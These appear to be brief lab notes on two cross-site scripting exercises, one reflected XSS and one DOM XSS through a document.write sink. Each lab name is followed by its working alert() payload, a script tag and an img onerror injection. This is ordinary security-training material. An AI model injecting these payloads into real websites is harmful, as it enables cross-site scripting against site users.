1. Reflected XSS into HTML context with nothing encoded

`<script>alert()</script>`

2. DOM XSS in document.write sink using source location.search

```txt
`sink` "><img src=x onerror=alert()>
```
